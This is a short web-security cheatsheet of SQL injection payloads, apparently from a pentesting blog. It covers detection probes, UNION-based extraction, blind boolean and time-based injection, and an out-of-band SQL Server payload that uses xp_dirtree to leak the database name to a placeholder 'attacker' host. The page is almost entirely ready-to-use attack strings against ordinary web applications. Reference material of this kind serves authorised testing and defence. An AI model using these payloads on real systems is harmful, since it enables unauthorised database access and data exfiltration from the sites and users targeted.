---
title: "SQL Injection Cheatsheet"
date: 2026-09-03
draft: false
description: "Payloads and techniques for detecting and exploiting SQL injection."
topics: ["web"]
---

## Detection

Classic probes to reveal injectable parameters:

```
' or 1=1-- -
" or ""="
1' order by 10-- -
```

Watch for error messages, changed row counts or blank pages.

## UNION-based

First find the number of columns with `order by`, then union the payload:

```
1' union select null,null-- -
1' union select 'a',version()-- -
```

## Blind

Conditional errors on MySQL:

```
1' and (select 1 from (select if(ascii(substr(user,1,1))=114,1,(select 1 union select 2)))x)-- -
```

Time-based:

```
1' and sleep(5)-- -
1' and pg_sleep(5)-- -
```

## Out of band

On SQL Server with `xp_dirtree`:

```
1'; declare @q varchar(99); set @q='\\attacker\'+(select db_name())+'.x.y\z'; exec master..xp_dirtree @q-- -
```